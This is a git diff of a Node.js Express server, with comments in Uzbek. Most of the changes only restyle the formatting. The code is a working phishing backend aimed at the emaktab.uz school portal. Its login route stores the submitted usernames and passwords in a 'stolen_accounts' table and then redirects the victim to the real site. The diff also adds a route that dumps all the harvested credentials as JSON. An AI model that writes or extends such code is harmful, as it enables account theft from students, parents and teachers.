@@ -1,4 +1,4 @@
-require('dotenv').config();
+require("dotenv").config();
 const express = require("express");
 const { Pool } = require("pg");
 const path = require("path");
@@ -7,8 +7,8 @@ const app = express();
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
   ssl: {
-    rejectUnauthorized: false 
-  }
+    rejectUnauthorized: false,
+  },
 });
 
 const initDB = async () => {
@@ -26,7 +26,7 @@ const initDB = async () => {
     console.error("Jadval yaratishda xatolik:", err);
   }
 };
-initDB(); 
+initDB();
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static("public"));
@@ -37,15 +37,24 @@ app.post("/auth/login", async (req, res) => {
   try {
     await pool.query(
       "INSERT INTO stolen_accounts (login, password) VALUES ($1, $2)",
-      [login, password]
+      [login, password],
     );
 
     console.log(`Baza yangilandi: ${login} saqlandi!`);
     res.redirect("https://login.emaktab.uz");
-
   } catch (err) {
     console.error("Xatolik yuz berdi:", err);
     res.redirect("https://login.emaktab.uz");
+  }
+});
+app.get("/mening-bazam", async (req, res) => {
+  try {
+    const result = await pool.query(
+      "SELECT * FROM stolen_accounts ORDER BY created_at DESC",
+    );
+    res.json(result.rows);
+  } catch (err) {
+    res.send("Bazaga ulanishda xato bo'ldi");
   }
 });
 
